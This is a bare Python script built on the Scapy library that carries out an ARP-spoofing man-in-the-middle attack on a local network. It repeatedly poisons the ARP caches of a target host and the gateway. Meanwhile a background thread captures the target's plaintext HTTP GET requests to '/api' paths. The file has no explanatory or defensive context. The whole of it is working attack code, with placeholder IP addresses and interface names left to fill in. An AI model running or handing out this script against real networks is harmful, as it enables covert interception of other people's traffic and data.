from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from scapy.layers.http import HTTPRequest
from scapy.sendrecv import sniff


def arp_spoof(target_ip, spoof_ip, interface='YOUR_INTERFACE'):
    target_mac = get_mac(target_ip)
    packet = Ether() / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=False)


def get_mac(ip):
    response, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=2, retry=10, verbose=False)
    for _, packet in response:
        return packet[Ether].src


def sniff_packets(interface='Wi-Fi'):
    def process_packet(packet):
        if packet.haslayer(HTTPRequest):
            # Check if it's an HTTP GET request
            if packet[HTTPRequest].Method.decode() == 'GET':
                # Check if the Path starts with '/api'
                if packet[HTTPRequest].Path.decode().startswith('/api'):
                    print("[*] HTTP GET Packet Captured with URI starting with /api:", packet.summary())

    print("Starting packet sniffing...")
    sniff(iface=interface, store=False, prn=process_packet, filter="tcp port 80")


# Use the IP addresses relevant to your network
target_ip = "192.168.1.5"
gateway_ip = "192.168.1.247"
interface = "Wi-Fi"

# Start the packet sniffer in a separate thread
sniffer_thread = threading.Thread(target=sniff_packets, args=(interface,), daemon=True)
sniffer_thread.start()

try:
    while True:
        arp_spoof(target_ip, gateway_ip, interface)
        arp_spoof(gateway_ip, target_ip, interface)
        time.sleep(10)
except KeyboardInterrupt:
    print("ARP spoofing stopped.")
